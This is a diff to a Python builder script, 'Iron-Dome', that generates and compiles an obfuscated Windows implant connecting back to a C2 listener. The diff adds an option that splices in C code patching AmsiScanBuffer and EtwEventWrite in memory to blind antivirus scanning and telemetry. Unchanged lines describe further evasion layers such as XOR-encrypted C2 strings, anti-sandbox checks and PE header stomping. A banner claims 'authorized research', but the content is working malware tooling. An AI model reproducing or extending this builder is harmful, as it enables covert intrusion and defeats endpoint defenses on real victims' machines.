@@ -15,19 +15,34 @@ Produces:
 
 import os, sys, subprocess, struct, hashlib, argparse, random, time, shutil
 
-VERSION    = "1.0.0"
+VERSION    = "2.0.0"
 BUILD_TAG  = "iron-dome"
 SRC_DIR    = os.path.join(os.path.dirname(__file__), "shell")
 OUT_DIR    = os.path.join(os.path.dirname(__file__), "builds", "iron_dome")
 
-# ── 7-LAYER EVASION STACK ──────────────────────────────────────────────────
-# Layer 1: XOR string obfuscation — all C2 strings encrypted at compile time
-# Layer 2: Dynamic API resolution — no direct imports of Ws2_32/kernel32 sigs
-# Layer 3: Anti-sandbox — timing check, screen resolution, disk space guard
-# Layer 4: PE header stomp — overwrites DOS magic + timestamp post-load
-# Layer 5: ISUN magic auth — payload verifies handshake token before executing
-# Layer 6: Jitter — randomised sleep 1-3s before connecting
-# Layer 7: gcc/MinGW PE — MSVC-less build, stripped exports, low entropy header
+BANNER = r"""
+  ╔══════════════════════════════════════════════════════════════╗
+  ║           I R O N - D O M E  ·  22DIV  ·  VADER            ║
+  ║      iron-sun  ·  CHEYANNE  ·  GHOST ENCODER  ·  ADF       ║
+  ╚══════════════════════════════════════════════════════════════╝
+
+       ADF RISING SUN                  IDF IRON DOME
+       ─────────────                   ─────────────
+            ╿                           ✦   ✦   ✦
+       \  \ ╿ / /                     ✦    ✡    ✦
+        \  \╿/ /       ≋≋≋≋≋         ✦  22DIV  ✦
+    ─────\──☀──/─────  ≋≋≋≋≋         ✦    ✡    ✦
+        /  /╿\ \       ≋≋≋≋≋           ✦   ✦   ✦
+       /  / ╿ \ \       INTERCEPTED     DOME ACTIVE
+            ╿
+
+  ✦ LAT -33.8688  LONG 151.2093  ✦  OPERATOR: VADER  ✦  ORACLE
+  ✦ OWN HARDWARE ONLY  ✦  AUTHORIZED RESEARCH  ✦  OPSEC ACTIVE
+"""
+
+# ── EVASION STACK ──────────────────────────────────────────────────────────
+# Layers 1-7: iron-sun base stack (always active)
+# Layer 8:    VADER AMSI/ETW bypass via memory patch (--vader flag)
 
 EVASION_LAYERS = [
     "XOR string obfuscation",
@@ -38,6 +53,43 @@ EVASION_LAYERS = [
     "Execution jitter",
     "MinGW/gcc PE (no MSVC fingerprint)",
 ]
+
+VADER_LAYER = "VADER AMSI/ETW bypass (memory patch + flush)"
+
+# C code injected before main() when --vader is active
+VADER_C = r"""
+/* ── LAYER 8: VADER — AMSI + ETW bypass ── */
+static void vader_patch(BYTE *fn, const BYTE *patch, SIZE_T len) {
+    DWORD old;
+    VirtualProtect(fn, len, PAGE_EXECUTE_READWRITE, &old);
+    memcpy(fn, patch, len);
+    VirtualProtect(fn, len, old, &old);
+    FlushInstructionCache(GetCurrentProcess(), fn, len);
+}
+static void vader_amsi_etw(void) {
+    /* AMSI: patch AmsiScanBuffer → xor eax,eax; ret → AMSI_RESULT_CLEAN */
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    if (amsi) {
+        BYTE *asb = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
+        if (asb) {
+            const BYTE patch_amsi[] = {0x31,0xC0,0xC3}; /* xor eax,eax; ret */
+            vader_patch(asb, patch_amsi, 3);
+        }
+    }
+    /* ETW: patch EtwEventWrite → xor eax,eax; ret → silences telemetry */
+    HMODULE nt = GetModuleHandleA("ntdll.dll");
+    if (nt) {
+        BYTE *etw = (BYTE*)GetProcAddress(nt, "EtwEventWrite");
+        if (etw) {
+            const BYTE patch_etw[] = {0x33,0xC0,0xC3}; /* xor eax,eax; ret */
+            vader_patch(etw, patch_etw, 3);
+        }
+    }
+}
+"""
+
+# Call site injected into main() when --vader is active
+VADER_CALL = "    vader_amsi_etw();\n"
 
 IRON_SUN_C = r"""
 #include <winsock2.h>
@@ -180,10 +232,11 @@ def xor_encrypt(data: bytes, key: int) -> list:
     return [b ^ key for b in data]
 
 
-def build_c_source(target_ip: str, port: int, xor_key: int, isun_magic: str = "ISUN 4445") -> str:
+def build_c_source(target_ip: str, port: int, xor_key: int,
+                   isun_magic: str = "ISUN 4445", vader: bool = False) -> str:
     src = IRON_SUN_C
 
-    ip_enc  = xor_encrypt(target_ip.encode(), xor_key)
+    ip_enc   = xor_encrypt(target_ip.encode(), xor_key)
     isun_enc = xor_encrypt(isun_magic.encode(), xor_key)
 
     ip_bytes   = ",".join(f"0x{b:02x}" for b in ip_enc)
@@ -195,6 +248,12 @@ def build_c_source(target_ip: str, port: int, xor_key: int, isun_magic: str = "I
     src = src.replace("ISUN_LEN_VAL", str(len(isun_enc)))
     src = src.replace("XOR_KEY_VAL",  f"0x{xor_key:02x}")
     src = src.replace("PORT_VAL",     str(port))
+
+    if vader:
+        # Inject VADER AMSI/ETW bypass before main() and call it first thing in main
+        src = src.replace("int main(void) {", VADER_C + "int main(void) {")
+        src = src.replace("    /* ── LAYER 3: Sandbox check ── */",
+                          VADER_CALL + "    /* ── LAYER 3: Sandbox check ── */")
 
     return src
 
@@ -272,13 +331,20 @@ def sha256(path: str) -> str:
     return h.hexdigest()
 
 
-def build(target: str, port: int, xor_key: int, out_dir: str, variant: int = 1):
+def build(target: str, port: int, xor_key: int, out_dir: str,
+          variant: int = 1, vader: bool = False):
     os.makedirs(out_dir, exist_ok=True)
 
-    print(f"\n{'='*60}")
+    print(BANNER)
+    layers = EVASION_LAYERS + ([VADER_LAYER] if vader else [])
+    n_layers = len(layers)
+
+    print(f"{'='*62}")
     print(f"  IRON-DOME BUILDER v{VERSION}")
     print(f"  Target: {target}:{port}  XOR: 0x{xor_key:02X}  Variant: v{variant}")
-    print(f"{'='*60}\n")
+    if vader:
+        print(f"  VADER: ACTIVE — AMSI/ETW bypass spliced into payload")
+    print(f"{'='*62}\n")
 
     # ── C source ──
     src_path = os.path.join(out_dir, f"iron_dome_v{variant}.c")
@@ -287,21 +353,24 @@ def build(target: str, port: int, xor_key: int, out_dir: str, variant: int = 1):
     doc_path = os.path.join(out_dir, f"iron_dome_v{variant}_deploy.md")
 
     print(f"[1/4] Generating C source ({os.path.basename(src_path)})...")
-    src = build_c_source(target, port, xor_key)
+    src = build_c_source(target, port, xor_key, vader=vader)
     with open(src_path, "w") as f:
         f.write(src)
     print(f"      XOR key 0x{xor_key:02X} applied to {len(target)} IP bytes + ISUN magic")
+    if vader:
+        print(f"      VADER AMSI/ETW bypass code injected")
 
-    print(f"[2/4] Compiling PE (7-layer evasion stack)...")
+    print(f"\n[2/4] Compiling PE ({n_layers}-layer evasion stack)...")
     ok = build_pe(src_path, out_path)
     if ok:
         sz  = os.path.getsize(out_path)
         h   = sha256(out_path)
-        print(f"      COMPILED — {sz} bytes")
+        print(f"      COMPILED — {sz:,} bytes")
         print(f"      SHA256: {h}")
         print(f"\n      Evasion layers applied:")
-        for i, layer in enumerate(EVASION_LAYERS, 1):
-            print(f"        [{i}] {layer}")
+        for i, layer in enumerate(layers, 1):
+            tag = " ← VADER" if i == 8 else ""
+            print(f"        [{i}] {layer}{tag}")
     else:
         print(f"      [!] Compiler not found. Source written — compile manually:")
         print(f"          x86_64-w64-mingw32-gcc -Os -s -lws2_32 -mwindows -o {out_path} {src_path}")
@@ -322,12 +391,13 @@ def build(target: str, port: int, xor_key: int, out_dir: str, variant: int = 1):
 | Target | {target}:{port} |
 | XOR Key | 0x{xor_key:02X} |
 | PE SHA256 | {h} |
-| PE Size | {sz} bytes |
-| Evasion Stack | 7 layers |
+| PE Size | {sz:,} bytes |
+| Evasion Stack | {n_layers} layers |
+| VADER | {"ACTIVE — AMSI/ETW bypass" if vader else "inactive"} |
 | Ghost Stager | Zero-width Unicode |
 
 ## Evasion Stack
-{"".join(f"- Layer {i}: {l}\\n" for i,l in enumerate(EVASION_LAYERS,1))}
+{"".join(f"- Layer {i}: {l}\\n" for i,l in enumerate(layers,1))}
 
 ## Deployment
 ### RADON (listener)
@@ -387,7 +457,8 @@ if __name__ == "__main__":
     parser.add_argument("--port",   type=int, default=4443,  help="C2 listener port")
     parser.add_argument("--xor",    type=lambda x: int(x,0), default=0xFC, help="XOR key (e.g. 0xAB)")
     parser.add_argument("--out",    default=OUT_DIR,         help="Output directory")
-    parser.add_argument("--variant",type=int, default=1,     help="Variant number")
+    parser.add_argument("--variant",type=int,  default=1,     help="Variant number")
+    parser.add_argument("--vader", action="store_true",       help="Splice VADER AMSI/ETW bypass (layer 8)")
     args = parser.parse_args()
 
-    build(args.target, args.port, args.xor, args.out, args.variant)
+    build(args.target, args.port, args.xor, args.out, args.variant, args.vader)
